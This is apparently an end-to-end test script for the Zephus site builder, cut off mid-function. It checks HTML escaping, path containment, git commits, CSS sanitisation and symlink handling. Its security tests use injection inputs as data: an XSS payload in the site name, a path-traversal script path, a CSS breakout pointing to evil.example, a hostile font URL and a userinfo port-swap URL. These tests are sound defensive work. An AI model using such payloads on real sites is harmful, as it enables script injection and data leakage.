#!/usr/bin/env node
/** Zephus E2E failure suite (temp Astro sites, no Electron).
 *
 * Exercises real main-process services against temp projects, reads/writes
 * bytes on disk, and records pass/fail in artifacts/e2e/<repo-sha>.json.
 * Several checks are expected to fail while named product bugs remain.
 *
 * REPEAT: `node scripts/e2e-failure-suite.js [--themes=all|smoke]`
 */
const fs = require("fs");
const os = require("os");
const path = require("path");
const vm = require("vm");
const { pathToFileURL } = require("url");
const http = require("http");
const net = require("net");
const { execFileSync, spawn } = require("child_process");

const ROOT = path.resolve(__dirname, "..");
const SMOKE_THEMES = ["minimal", "blog", "store"];

function ensureDraftsUserDataDir() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "zephus-e2e-userdata-"));
  globalThis.__zephusE2eUserData = dir;
  const Module = require("module");
  const originalLoad = Module._load;
  Module._load = function zephusE2eElectronShim(request, parent, isMain) {
    if (request === "electron") {
      return {
        app: {
          getPath: (name) =>
            name === "userData" ? globalThis.__zephusE2eUserData : dir,
          getAppPath: () => ROOT,
          isPackaged: false,
        },
      };
    }
    return originalLoad.call(this, request, parent, isMain);
  };
  return dir;
}
const BUILD_THEMES = ["minimal", "store"];

const checks = [];
let passed = 0;
let failed = 0;

function repoSha() {
  try {
    return execFileSync("git", ["rev-parse", "HEAD"], {
      cwd: ROOT,
      encoding: "utf8",
    }).trim();
  } catch {
    return "unknown";
  }
}

function record(name, ok, detail = "") {
  checks.push({ name, ok: !!ok, detail: detail || (ok ? "ok" : "failed") });
  if (ok) {
    passed += 1;
    console.log(`  ✓ ${name}`);
  } else {
    failed += 1;
    console.error(`  ✖ ${name}: ${detail || "failed"}`);
  }
}

function squashText(text) {
  return text.replace(/\s+/g, " ").replace(/\(\s/g, "(").replace(/\s\)/g, ")");
}

function mkSite(svc, themeId) {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), `zephus-e2e-${themeId}-`));
  const project = path.join(tmp, "site");
  fs.mkdirSync(project, { recursive: true });
  const created = svc.wizard.createSite(project, themeId);
  if (!created.ok) throw new Error(`scaffold ${themeId}: ${created.error}`);
  const ensured = svc.schema.ensureVisualSchema(project, "src/pages");
  if (!ensured.ok) throw new Error(`ensure ${themeId}: ${ensured.error}`);
  return { tmp, project, pagesDir: path.join(project, "src", "pages") };
}

function copyE2eProof(project, label) {
  const sha = repoSha();
  const dest = path.join(ROOT, "artifacts", "e2e", sha, "proof");
  try {
    fs.mkdirSync(dest, { recursive: true });
    const index = path.join(project, "src", "pages", "index.astro");
    if (fs.existsSync(index)) {
      fs.copyFileSync(index, path.join(dest, `${label}-index.astro`));
    }
  } catch {
    /* proof copy is best-effort */
  }
}

function rm(tmp) {
  fs.rmSync(tmp, { recursive: true, force: true });
}

function firstPage(pagesDir) {
  const files = fs.readdirSync(pagesDir).filter((f) => f.endsWith(".astro"));
  if (files.length === 0) return null;
  files.sort();
  return files.includes("index.astro") ? "index.astro" : files[0];
}

/** Runs the managed layout's emitted `absolute()` (from BaseLayout frontmatter) in vm. */
function callExtractedLayoutAbsolute(layoutSource, pathValue) {
  const fmMatch = layoutSource.match(/^---\r?\n([\s\S]*?)\r?\n---/);
  const fm = fmMatch ? fmMatch[1] : layoutSource;
  const siteUrlLine = fm.match(/const siteUrl = (.+);/);
  const absMatch = fm.match(
    /const absolute = \(value(?:: string)?\)(?:: string)? => \{([\s\S]*?)\};\s*\r?\nconst canonical/,
  );
  if (!siteUrlLine || !absMatch) {
    return { ok: false, error: "layout absolute helper missing" };
  }
  const body = absMatch[1].replace(/let resolved: URL;/g, "let resolved;");
  const script = [
    `const siteUrl = ${siteUrlLine[1]};`,
    `const absolute = (value) => {${body}};`,
    "absolute;",
  ].join("\n");
  try {
    const absoluteFn = vm.runInNewContext(script, { URL }, { timeout: 2000 });
    if (typeof absoluteFn !== "function") {
      return { ok: false, error: "absolute is not a function" };
    }
    return { ok: true, href: absoluteFn(pathValue) };
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

function sitemapLocForRoute(sitemapXml, route) {
  const re = new RegExp(
    `<loc>([^<]*${route.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}[^<]*)</loc>`,
  );
  const m = sitemapXml.match(re);
  return m ? m[1].trim() : "";
}

function writeArtifactAndExit() {
  const sha = repoSha();
  const outDir = path.join(ROOT, "artifacts", "e2e");
  fs.mkdirSync(outDir, { recursive: true });
  const payload = { sha, passed, failed, checks };
  fs.writeFileSync(
    path.join(outDir, `${sha}.json`),
    `${JSON.stringify(payload, null, 2)}\n`,
    "utf8",
  );
  console.log(`\nE2E: ${passed} passed, ${failed} failed.`);
  console.log(`Artifact: artifacts/e2e/${sha}.json`);
  process.exit(failed > 0 ? 1 : 0);
}

async function runProductChecks(svc, blockRender) {
  let ctx;
  try {
    ctx = mkSite(svc, "minimal");
  } catch (e) {
    record("product checks scaffold", false, e.message);
    return;
  }
  const { tmp, project, pagesDir } = ctx;
  const pagesRel = "src/pages";
  try {
    {
      const siteRead = svc.schema.readSiteDocument(project);
      if (!siteRead.ok || !siteRead.site) {
        record("default footer escapes site name", false, "no site doc");
      } else {
        const original = structuredClone(siteRead.site);
        siteRead.site.siteName = "<img src=x onerror=alert(1)>";
        delete siteRead.site.shell.footerHtml;
        const written = svc.schema.writeSiteDocument(
          project,
          siteRead.site,
          pagesRel,
        );
        const again = svc.schema.readSiteDocument(project);
        const footer = again.site?.shell?.footerHtml ?? "";
        const escaped =
          written.ok === true &&
          footer.includes("&lt;img") &&
          !footer.includes("<img");
        record(
          "default footer escapes site name",
          escaped,
          escaped ? "ok" : footer || written.error || "no footer",
        );
        svc.schema.writeSiteDocument(project, original, pagesRel);
      }
    }
    {
      const siteRead = svc.schema.readSiteDocument(project);
      if (!siteRead.ok || !siteRead.site) {
        record("custom script path stays inside public", false, "no site doc");
      } else {
        const original = structuredClone(siteRead.site);
        const outside = path.join(project, "outside.js");
        const scriptsDir = path.join(project, "public", "scripts");
        const link = path.join(scriptsDir, "escape.js");
        const okFile = path.join(scriptsDir, "ok.js");
        const layoutPath = path.join(
          project,
          "src",
          "layouts",
          "BaseLayout.astro",
        );
        try {
          fs.writeFileSync(outside, "export default 1;\n");
          fs.mkdirSync(scriptsDir, { recursive: true });
          fs.symlinkSync(outside, link);
          siteRead.site.shell.customScriptsPath =
            "public/scripts/../../outside.js";
          const dotdot = svc.schema.writeSiteDocument(
            project,
            siteRead.site,
            pagesRel,
          );
          const afterDotdot = fs.readFileSync(layoutPath, "utf8");
          siteRead.site.shell.customScriptsPath = "public/scripts/escape.js";
          const linked = svc.schema.writeSiteDocument(
            project,
            siteRead.site,
            pagesRel,
          );
          const afterLink = fs.readFileSync(layoutPath, "utf8");
          fs.writeFileSync(okFile, "export default 2;\n");
          siteRead.site.shell.customScriptsPath = "public/scripts/ok.js";
          const okWrite = svc.schema.writeSiteDocument(
            project,
            siteRead.site,
            pagesRel,
          );
          const afterOk = fs.readFileSync(layoutPath, "utf8");
          const safe =
            dotdot.ok === true &&
            linked.ok === true &&
            okWrite.ok === true &&
            !afterDotdot.includes("outside.js") &&
            !afterLink.includes("escape.js") &&
            !afterLink.includes("outside.js") &&
            afterOk.includes('src="/scripts/ok.js"');
          record(
            "custom script path stays inside public",
            safe,
            safe ? "ok" : "script url left the public directory",
          );
        } catch (error) {
          record(
            "custom script path stays inside public",
            false,
            error instanceof Error ? error.message : String(error),
          );
        } finally {
          svc.schema.writeSiteDocument(project, original, pagesRel);
          fs.rmSync(link, { force: true });
          fs.rmSync(okFile, { force: true });
          fs.rmSync(outside, { force: true });
        }
      }
    }
    // 1. Rich text find/replace preserves href and tag names.
    {
      const page = firstPage(pagesDir);
      if (!page) {
        record("rich text replace preserves markup", false, "no page");
      } else {
        const doc = svc.schema.readPageDocument(project, page, pagesRel);
        if (!doc.ok || !doc.pageDocument) {
          record(
            "rich text replace preserves markup",
            false,
            doc.error ?? "no doc",
          );
        } else {
          const linkText = 'See <a href="/about">about</a>';
          const strongText = "<strong>about</strong>";
          const section = doc.pageDocument.sections[0];
          if (section) {
            section.children.push(
              {
                id: "e2e-rich-link",
                type: "text",
                props: { text: linkText },
                style: {},
              },
              {
                id: "e2e-rich-strong",
                type: "text",
                props: { text: strongText },
                style: {},
              },
            );
          }
          svc.schema.writePageDocument(project, pagesRel, doc.pageDocument);
          const rep = svc.findReplace.replaceAllInPages(
            project,
            pagesRel,
            "about",
            "visit",
          );
          const after = svc.schema.readPageDocument(project, page, pagesRel);
          let linkVal = "";
          let strongVal = "";
          if (after.ok && after.pageDocument) {
            const walk = (nodes) => {
              for (const n of nodes) {
                if (n.id === "e2e-rich-link") linkVal = n.props.text ?? "";
                if (n.id === "e2e-rich-strong") strongVal = n.props.text ?? "";
                if (n.children) walk(n.children);
              }
            };
            walk(after.pageDocument.sections);
          }
          const refused = !rep.ok || rep.replaced === 0;
          const linkTextOnly = linkVal.replace(/<[^>]*>/g, "");
          const visibleChanged =
            /visit/i.test(linkTextOnly) && !/\babout\b/i.test(linkTextOnly);
          const hrefOk = linkVal.includes('href="/about"');
          const strongOk = /<strong\b/i.test(strongVal);
          const pass = (visibleChanged || refused) && hrefOk && strongOk;
          record(
            "rich text replace preserves markup",
            pass,
            `refused=${refused} link=${JSON.stringify(linkVal).slice(0, 120)} strong=${JSON.stringify(strongVal)}`,
          );
        }
      }
    }

    // 2. Partial git commit (only requested paths should land).
    {
      if (!fs.existsSync(path.join(project, ".git"))) {
        execFileSync("git", ["init"], { cwd: project, stdio: "ignore" });
      }
      execFileSync("git", ["config", "user.name", "E2E"], {
        cwd: project,
        stdio: "ignore",
      });
      execFileSync("git", ["config", "user.email", "e2e@zephus.local"], {
        cwd: project,
        stdio: "ignore",
      });
      fs.writeFileSync(path.join(project, "file-a.txt"), "A\n", "utf8");
      fs.writeFileSync(path.join(project, "file-b.txt"), "B\n", "utf8");
      execFileSync("git", ["add", "file-a.txt"], { cwd: project });
      const gitMod = await import(
        pathToFileURL(path.join(ROOT, "dist", "main", "services", "git.js"))
          .href
      );
      const commit = await gitMod.commitProjectPaths(project, "partial", [
        "file-b.txt",
      ]);
      let names = "";
      if (commit.ok) {
        names = execFileSync(
          "git",
          ["show", "--name-only", "--pretty=format:"],
          { cwd: project, encoding: "utf8" },
        ).trim();
      }
      const pass =
        commit.ok &&
        /\bfile-b\.txt\b/.test(names) &&
        !/\bfile-a\.txt\b/.test(names);
      record(
        "partial git commit respects path list",
        pass,
        commit.ok ? `names=${names}` : (commit.error ?? "commit failed"),
      );
    }

    // Quoted porcelain names (leading space, and a rename whose old name
    // contains the arrow) must commit as the real filename.
    {
      let repo = "";
      try {
        repo = fs.mkdtempSync(path.join(os.tmpdir(), "zephus-e2e-git-"));
        execFileSync("git", ["init", "-q", "-b", "main"], { cwd: repo });
        execFileSync("git", ["config", "user.email", "e2e@zephus.local"], {
          cwd: repo,
        });
        execFileSync("git", ["config", "user.name", "E2E"], { cwd: repo });
        const spaced = " foo.txt";
        const middle = "my file.txt";
        fs.writeFileSync(path.join(repo, spaced), "edge\n");
        fs.writeFileSync(path.join(repo, middle), "mid\n");
        const gitMod = await import(
          pathToFileURL(path.join(ROOT, "dist", "main", "services", "git.js"))
            .href
        );
        const status = execFileSync(
          "git",
          ["-c", "core.quotePath=false", "status", "--porcelain", "-uall"],
          { cwd: repo, encoding: "utf8" },
        );
        const parsed = gitMod.parseStatusPorcelain(status);
        const quotedRename = gitMod.parseStatusPorcelain(
          'R  "old -> name.txt" -> "new file.txt"\n M notes -> draft.md\n',
        );
        const commit = await gitMod.commitProjectPaths(repo, "spaced names", [
          spaced,
          middle,
        ]);
        const listed = commit.ok
          ? execFileSync("git", ["ls-files", "-z"], {
              cwd: repo,
              encoding: "utf8",
            })
              .split("\0")
              .filter(Boolean)
          : [];
        const pass =
          parsed.added.includes(spaced) &&
          parsed.added.includes(middle) &&
          !parsed.added.some((name) => name.includes('"')) &&
          quotedRename.modified.length === 2 &&
          quotedRename.modified[0] === "new file.txt" &&
          quotedRename.modified[1] === "notes -> draft.md" &&
          commit.ok === true &&
          listed.includes(spaced) &&
          listed.includes(middle);
        record(
          "git porcelain keeps spaced filenames",
          pass,
          commit.ok
            ? `added=${JSON.stringify(parsed.added)} listed=${JSON.stringify(listed)} rename=${JSON.stringify(quotedRename.modified)}`
            : (commit.error ?? "commit failed"),
        );
      } catch (error) {
        record(
          "git porcelain keeps spaced filenames",
          false,
          error instanceof Error ? error.message : String(error),
        );
      } finally {
        if (repo) fs.rmSync(repo, { recursive: true, force: true });
      }
    }

    // 3. Frontmatter draft survives visual save regen.
    {
      const indexPath = path.join(pagesDir, "index.astro");
      const raw = fs.readFileSync(indexPath, "utf8");
      const withDraft = raw.includes("draft:")
        ? raw
        : raw.replace(/^---\n/m, "---\ndraft: true\n");
      fs.writeFileSync(indexPath, withDraft, "utf8");
      const indexRel = path.join(pagesRel, "index.astro").replace(/\\/g, "/");
      const indexDoc = svc.schema.readPageDocument(project, indexRel, pagesRel);
      if (indexDoc.ok && indexDoc.pageDocument) {
        svc.schema.writePageDocument(project, pagesRel, indexDoc.pageDocument);
      }
      const after = fs.readFileSync(indexPath, "utf8");
      record(
        "frontmatter draft survives regen",
        after.includes("draft: true"),
        after.includes("draft: true") ? "ok" : "draft line missing after save",
      );
    }

    // 5. Design accent slash preserved in managed CSS.
    {
      const siteRead = svc.schema.readSiteDocument(project);
      if (!siteRead.ok || !siteRead.site) {
        record("design slash in managed css", false, "no site doc");
      } else {
        const accent = "rgb(10 20 30 / 0.5)";
        siteRead.site.design.accent = accent;
        svc.schema.writeSiteDocument(project, siteRead.site, pagesRel);
        const cssPath = path.join(
          project,
          "public",
          "styles",
          "zephus-managed.css",
        );
        const css = fs.existsSync(cssPath)
          ? fs.readFileSync(cssPath, "utf8")
          : "";
        record(
          "design slash in managed css",
          css.includes(accent),
          css.includes(accent) ? "ok" : "accent stripped from css",
        );
        const breakout = "red;}body{background:url(https://evil.example)}";
        siteRead.site.design.accent = breakout;
        svc.schema.writeSiteDocument(project, siteRead.site, pagesRel);
        const cssAfterBreakout = fs.existsSync(cssPath)
          ? fs.readFileSync(cssPath, "utf8")
          : "";
        const sanitized = "redbodybackground:";
        const accentLine = cssAfterBreakout
          .split("\n")
          .find((line) => line.includes("--zephus-accent:"));
        const contained =
          !!accentLine &&
          accentLine.includes(sanitized) &&
          !accentLine.toLowerCase().includes("url(") &&
          !cssAfterBreakout.includes("evil.example") &&
          !cssAfterBreakout.includes("}body") &&
          !cssAfterBreakout.includes("{background");
        record(
          "design token cannot break out of managed css",
          contained,
          contained ? "ok" : "accent broke out of the declaration",
        );
        siteRead.site.design.accent = accent;
        svc.schema.writeSiteDocument(project, siteRead.site, pagesRel);
      }
    }

    {
      const siteRead = svc.schema.readSiteDocument(project);
      if (!siteRead.ok || !siteRead.site) {
        record("font stylesheet stays on google fonts", false, "no site doc");
      } else {
        const original = structuredClone(siteRead.site);
        const layoutPath = path.join(
          project,
          "src",
          "layouts",
          "BaseLayout.astro",
        );
        const evil = "https://evil.example/steal.css";
        const google = "https://fonts.googleapis.com/css2?family=Inter";
        try {
          siteRead.site.design.fontImportUrl = evil;
          const evilWrite = svc.schema.writeSiteDocument(
            project,
            siteRead.site,
            pagesRel,
          );
          const afterEvil = fs.readFileSync(layoutPath, "utf8");
          siteRead.site.design.fontImportUrl = google;
          const googleWrite = svc.schema.writeSiteDocument(
            project,
            siteRead.site,
            pagesRel,
          );
          const afterGoogle = fs.readFileSync(layoutPath, "utf8");
          const safe =
            evilWrite.ok === true &&
            googleWrite.ok === true &&
            !afterEvil.includes("evil.example") &&
            afterGoogle.includes(`href="${google}"`);
          record(
            "font stylesheet stays on google fonts",
            safe,
            safe ? "ok" : "font url was not restricted",
          );
        } finally {
          svc.schema.writeSiteDocument(project, original, pagesRel);
        }
      }
    }

    // 6. Columns block paints display:grid in built output (not editor-only).
    {
      const page = firstPage(pagesDir);
      const doc = page
        ? svc.schema.readPageDocument(project, page, pagesRel)
        : null;
      if (!doc?.ok || !doc.pageDocument) {
        record("columns block display grid", false, "no page doc");
      } else {
        const section = doc.pageDocument.sections[0];
        if (section) {
          section.children.push({
            id: "e2e-columns",
            type: "columns",
            props: { col1: "One", col2: "Two", count: "2" },
            style: { columns: 2 },
          });
        }
        svc.schema.writePageDocument(project, pagesRel, doc.pageDocument);
        svc.schema.ensureVisualSchema(project, pagesRel);
        const cssPath = path.join(
          project,
          "public",
          "styles",
          "zephus-managed.css",
        );
        const css = fs.existsSync(cssPath)
          ? fs.readFileSync(cssPath, "utf8")
          : "";
        const pageBytes = fs.readFileSync(path.join(pagesDir, page), "utf8");
        const gridRe =
          /display\s*:\s*grid[\s\S]*?(columns|data-zephus-block="columns")|[\s\S]*?(columns|data-zephus-block="columns")[\s\S]*display\s*:\s*grid/i;
        record(
          "columns block display grid",
          gridRe.test(css) || gridRe.test(pageBytes),
          "no display:grid rule for columns in managed css or page",
        );
      }
    }

    // 7. hideOn tablet uses min-width media query.
    {
      const sections = [
        {
          id: "sec-hide",
          type: "section",
          label: "Hide",
          props: { wrapper: "none", cls: "" },
          children: [
            {
              id: "block-tablet-hide",
              type: "text",
              props: { text: "Hide me on tablet" },
              style: { hideOn: ["tablet"] },
            },
          ],
        },
      ];
      const css = blockRender.collectResponsiveCss(sections);
      const tabletHidden = /display\s*:\s*none/i.test(css);
      const minWidthQuery =
        /@media[^{]*min-width[\s\S]*display\s*:\s*none/i.test(css);
      record(
        "hideOn tablet min-width query",
        tabletHidden && minWidthQuery,
        css.slice(0, 200),
      );
    }

    // 8. HTML block keeps section raw without extra section node.
    {
      const page = firstPage(pagesDir);
      const doc = page
        ? svc.schema.readPageDocument(project, page, pagesRel)
        : null;
      if (!doc?.ok || !doc.pageDocument) {
        record("html block section identity", false, "no doc");
      } else {
        for (const sec of doc.pageDocument.sections) {
          sec.props.wrapper = "none";
        }
        const rawHtml = "<section>\n  <p>ZEPHUSHTML</p>\n</section>";
        const countSectionNodes = (sections) => {
          let total = 0;
          const walk = (nodes) => {
            for (const n of nodes) {
              if (n.type === "section") total += 1;
              if (n.children) walk(n.children);
            }
          };
          walk(sections);
          return total;
        };
        const sectionsBefore = countSectionNodes(doc.pageDocument.sections);
        doc.pageDocument.sections[0]?.children.push({
          id: "e2e-html-block",
          type: "html",
          props: {},
          raw: rawHtml,
        });
        svc.schema.writePageDocument(project, pagesRel, doc.pageDocument);
        const pageRel = path.join(pagesRel, page).replace(/\\/g, "/");
        const astroPath = path.join(project, pageRel);
        const slug = page.replace(/\.astro$/, "");
        const sidecar = path.join(project, ".zephus", "pages", `${slug}.json`);
        if (fs.existsSync(sidecar)) fs.rmSync(sidecar, { force: true });
        const parsedSections = svc.schema.parseSectionsFromSource(
          fs.readFileSync(astroPath, "utf8"),
        );
        let htmlBlocks = 0;
        let goodRaw = false;
        const sectionsAfter = countSectionNodes(parsedSections);
        const walk = (nodes) => {
          for (const n of nodes) {
            if (n.type === "html") {
              htmlBlocks += 1;
              if (
                (n.raw ?? "").includes("<section>") &&
                (n.raw ?? "").includes("ZEPHUSHTML")
              ) {
                goodRaw = true;
              }
            }
            if (n.children) walk(n.children);
          }
        };
        walk(parsedSections);
        record(
          "html block section identity",
          htmlBlocks === 1 && goodRaw && sectionsAfter === sectionsBefore,
          `htmlBlocks=${htmlBlocks} goodRaw=${goodRaw} sectionsBefore=${sectionsBefore} sectionsAfter=${sectionsAfter}`,
        );
      }
    }

    // 9. Publish fails when build succeeds without index.html.
    {
      const pkgPath = path.join(project, "package.json");
      const pkg = JSON.parse(fs.readFileSync(pkgPath, "utf8"));
      pkg.scripts = {
        ...pkg.scripts,
        build: 'node -e "process.exit(0)"',
      };
      fs.writeFileSync(pkgPath, `${JSON.stringify(pkg, null, 2)}\n`, "utf8");
      const publishMod = await import(
        pathToFileURL(path.join(ROOT, "dist", "main", "services", "publish.js"))
          .href
      );
      const result = await publishMod.buildAndReveal(
        project,
        "dist",
        undefined,
        {
          reveal: false,
        },
      );
      record(
        "publish proof requires html output",
        !result.ok,
        result.ok
          ? "build returned ok without html check"
          : (result.error ?? "ok"),
      );
    }

    // 10. Custom node path + symlink rejection.
    {
      const nodeCheck = await import(
        pathToFileURL(
          path.join(ROOT, "dist", "main", "services", "nodeCheck.js"),
        ).href
      );
      const missing = path.join(
        os.tmpdir(),
        `zephus-no-node-${Date.now()}`,
        "node",
      );
      const check = await nodeCheck.checkNodeVersion(missing);
      const passCustom =
        check.status === "missing" &&
        check.usedCustomPath === true &&
        check.binaryPath === missing;
      record(
        "custom node missing path not ok",
        passCustom,
        JSON.stringify({
          status: check.status,
          binaryPath: check.binaryPath,
          usedCustomPath: check.usedCustomPath,
        }),
      );
      const linkDir = fs.mkdtempSync(
        path.join(os.tmpdir(), "zephus-node-link-"),
      );
      const linkPath = path.join(linkDir, "node");
      try {
        fs.symlinkSync(process.execPath, linkPath);
        const val = nodeCheck.validateNodePath(linkPath);
        const passSymlink =
          val.ok === false &&
          typeof val.error === "string" &&
          val.error.includes("symbolic link");
        record(
          "validateNodePath rejects node symlink",
          passSymlink,
          val.error ?? "rejected",
        );
      } finally {
        rm(linkDir);
      }
    }

    // 11. Widened pagesDir cannot delete non-pages.
    {
      const layoutDir = path.join(project, "src", "layouts");
      fs.mkdirSync(layoutDir, { recursive: true });
      const layoutPage = path.join(layoutDir, "ProbeLayout.astro");
      fs.writeFileSync(layoutPage, "---\n---\n<p>not a page</p>\n", "utf8");
      const indexPath = path.join(pagesDir, "index.astro");
      const wideDel = svc.pageManager.deletePage(
        project,
        "src/layouts/ProbeLayout.astro",
        "src",
      );
      record(
        "widened pagesDir delete blocked",
        (!wideDel || wideDel.ok === false) &&
          fs.existsSync(layoutPage) &&
          fs.existsSync(indexPath),
        wideDel && wideDel.ok ? "deleted non-page via widened dir" : "ok",
      );
    }

    // 12. Homepage delete refused (real page path; run last — may delete index).
    {
      const indexRel = path.join(pagesRel, "index.astro").replace(/\\/g, "/");
      const indexPath = path.join(project, indexRel);
      const del = svc.pageManager.deletePage(project, indexRel, pagesRel);
      const err = (del && del.error) || "";
      const homeError = /home\s*page|homepage/i.test(err);
      const pathOnlyRejection = /not a page inside the site/i.test(err);
      const pass =
        del &&
        del.ok === false &&
        fs.existsSync(indexPath) &&
        homeError &&
        !pathOnlyRejection;
      record(
        "homepage delete refused",
        pass,
        del && del.ok
          ? "index deleted"
          : pathOnlyRejection
            ? `wrong rejection: ${err}`
            : homeError
              ? "ok"
              : `error=${err || "none"}`,
      );
    }
  } finally {
    copyE2eProof(project, "product");
    rm(tmp);
  }
}

async function runFreshQualityPassChecks(svc, blockRender) {
  const pagesRel = "src/pages";
  const siteUrlDocs = "https://example.com/docs/";

  {
    const devServer = await import(
      pathToFileURL(path.join(ROOT, "dist", "main", "services", "devServer.js"))
        .href
    );
    const sneaky = new devServer.DevServerUrlScanner();
    const normal = new devServer.DevServerUrlScanner();
    const pathAt = new devServer.DevServerUrlScanner();
    const sneakyUrl = sneaky.push(
      "Local: http://127.0.0.1:1@127.0.0.1:9222/\n",
    );
    const normalUrl = normal.push("Local: http://localhost:4321/\n");
    const pathUrl = pathAt.push("Local: http://localhost:4321/user@site\n");
    const rust = fs.readFileSync(
      path.join(ROOT, "src-tauri", "src", "window.rs"),
      "utf8",
    );
    const previewFn =
      rust.match(/pub fn is_loopback_preview_url[\s\S]*?\n\}/)?.[0] ?? "";
    const windowRejectsUserinfo =
      previewFn.includes("username().is_empty()") &&
      previewFn.includes("password().is_some()") &&
      previewFn.includes('"localhost"') &&
      previewFn.includes('"127.0.0.1"');
    record(
      "preview url rejects userinfo port swap",
      sneakyUrl === null &&
        normalUrl === "http://localhost:4321/" &&
        pathUrl === "http://localhost:4321/user@site" &&
        windowRejectsUserinfo,
      `sneaky=${sneakyUrl} normal=${normalUrl} path=${pathUrl} window=${windowRejectsUserinfo}`,
    );
    const sneakyPort = sneaky.pendingPort();
    const normalPort = normal.pendingPort();
    record(
      "preview port hint ignores userinfo",
      sneakyPort === null && normalPort === 4321,
      `sneakyPort=${sneakyPort} normalPort=${normalPort}`,
    );
    const navigationFn =
      rust.match(/fn allow_preview_navigation[\s\S]*?\n\}/)?.[0] ?? "";
    record(
      "preview navigation stays on the opened port",
      navigationFn.includes("PREVIEW_PORT.load") &&
        navigationFn.includes("port_or_known_default()") &&
        rust.includes("PREVIEW_PORT.swap(port") &&
        rust.includes("PREVIEW_PORT.store(0"),
      navigationFn ? "navigation guard found" : "navigation guard missing",
    );
  }

  // 1. Canonical vs sitemap for root-relative routes under a site URL path base.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record(
        "canonical matches sitemap for root-relative routes",
        false,
        e.message,
      );
      ctx = null;
    }
    if (ctx) {
      const { tmp, project, pagesDir } = ctx;
      try {
        const about = svc.schema.createSchemaPage(project, pagesRel, "about");
        if (!about.ok) {
          record(
            "canonical matches sitemap for root-relative routes",
            false,
            about.error ?? "about page",
          );
        } else {
          const siteRead = svc.schema.readSiteDocument(project);
          if (!siteRead.ok || !siteRead.site) {
            record(
              "canonical matches sitemap for root-relative routes",
              false,
              "no site",
            );
          } else {
            siteRead.site.siteUrl = siteUrlDocs;
            svc.schema.writeSiteDocument(project, siteRead.site, pagesRel);
            const sitemapPath = path.join(project, "public", "sitemap.xml");
            const sitemap = fs.existsSync(sitemapPath)
              ? fs.readFileSync(sitemapPath, "utf8")
              : "";
            const loc = sitemapLocForRoute(sitemap, "/about");
            const expected = svc.schema.resolveAbsoluteHttpUrl(
              siteUrlDocs,
              "/about",
            );
            const layoutPath = path.join(
              project,
              siteRead.site.shell.layoutPath.replace(/\\/g, "/"),
            );
            const layoutSrc = fs.readFileSync(layoutPath, "utf8");
            const layoutAbs = callExtractedLayoutAbsolute(layoutSrc, "/about");
            const layoutHref = layoutAbs.ok ? layoutAbs.href : "";
            const pass =
              loc === expected &&
              layoutHref === expected &&
              loc === layoutHref &&
              loc.length > 0;
            record(
              "canonical matches sitemap for root-relative routes",
              pass,
              layoutAbs.ok
                ? `loc=${loc} layout=${layoutHref} expected=${expected}`
                : (layoutAbs.error ?? "layout eval failed"),
            );
          }
        }
      } finally {
        rm(tmp);
      }
    }
  }

  // 2. Sidecar write when .zephus is a symlink outside the project.
  {
    let ctx;
    const external = fs.mkdtempSync(
      path.join(os.tmpdir(), "zephus-e2e-zephus-out-"),
    );
    try {
      ctx = mkSite(svc, "minimal");
      const { tmp, project, pagesDir } = ctx;
      const page = firstPage(pagesDir);
      let pageDoc = null;
      if (page) {
        const doc = svc.schema.readPageDocument(project, page, pagesRel);
        if (doc.ok && doc.pageDocument) pageDoc = doc.pageDocument;
      }
      const zephusLink = path.join(project, ".zephus");
      fs.rmSync(zephusLink, { recursive: true, force: true });
      fs.symlinkSync(external, zephusLink, "dir");
      let threw = false;
      if (pageDoc) {
        try {
          svc.schema.writePageDocumentFile(project, pageDoc);
        } catch {
          threw = true;
        }
      }
      const outsideJson = fs
        .readdirSync(external, { recursive: true, withFileTypes: true })
        .some((e) => e.isFile() && e.name.endsWith(".json"));
      const pass = threw && !outsideJson;
      record(
        "sidecar write rejects external zephus symlink",
        pass,
        `threw=${threw} outsideJson=${outsideJson}`,
      );
      rm(tmp);
    } catch (e) {
      record("sidecar write rejects external zephus symlink", false, e.message);
    } finally {
      rm(external);
    }
  }

  // 2b. listPages must not follow src/pages symlink outside the project.
  {
    let ctx;
    const external = fs.mkdtempSync(
      path.join(os.tmpdir(), "zephus-e2e-pages-out-"),
    );
    try {
      fs.writeFileSync(
        path.join(external, "leak-outside.astro"),
        "---\n---\n<p>outside</p>\n",
        "utf8",
      );
      ctx = mkSite(svc, "minimal");
      const { tmp, project } = ctx;
      const pagesLink = path.join(project, "src", "pages");
      fs.rmSync(pagesLink, { recursive: true, force: true });
      fs.symlinkSync(external, pagesLink, "dir");
      const projectMod = await import(
        pathToFileURL(path.join(ROOT, "dist", "main", "services", "project.js"))
          .href
      );
      const listed = projectMod.listPages(project, "src/pages");
      const leaked = listed.some((p) =>
        p.replace(/\\/g, "/").endsWith("leak-outside.astro"),
      );
      record(
        "listPages rejects external pages symlink",
        !leaked,
        `listed=${listed.join(", ") || "(empty)"}`,
      );
      rm(tmp);
    } catch (e) {
      record("listPages rejects external pages symlink", false, e.message);
    } finally {
      rm(external);
    }
  }

  // 2c. Non-array `sections` sidecar must not empty the sidecar or rewrite .astro.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
      const { tmp, project, pagesDir } = ctx;
      const pagesRel = "src/pages";
      const page = firstPage(pagesDir);
      if (!page) {
        record("malformed sections sidecar preserved", false, "no page");
      } else {
        const astroPath = path.join(pagesDir, page);
        const astroBefore = fs.readFileSync(astroPath, "utf8");
        const slug =
          page === "index.astro" ? "index" : page.replace(/\.astro$/, "");
        const sidecarPath = path.join(
          project,
          ".zephus",
          "pages",
          `${slug}.json`,
        );
        const prior = fs.existsSync(sidecarPath)
          ? JSON.parse(fs.readFileSync(sidecarPath, "utf8"))
          : null;
        const badSidecar = {
          ...(prior ?? {}),
          slug,
          page: `${pagesRel}/${page}`.replace(/\\/g, "/"),
          sections: "not-an-array",
        };
        fs.writeFileSync(
          sidecarPath,
          JSON.stringify(badSidecar, null, 2),
          "utf8",
        );
        svc.schema.ensureVisualSchema(project, pagesRel);
        const sidecarAfter = JSON.parse(fs.readFileSync(sidecarPath, "utf8"));
        const astroAfter = fs.readFileSync(astroPath, "utf8");
        const preserved =
          sidecarAfter.sections === "not-an-array" &&
          astroAfter === astroBefore;
        record(
          "malformed sections sidecar preserved",
          preserved,
          `sectionsType=${typeof sidecarAfter.sections} astroChanged=${astroAfter !== astroBefore}`,
        );
      }
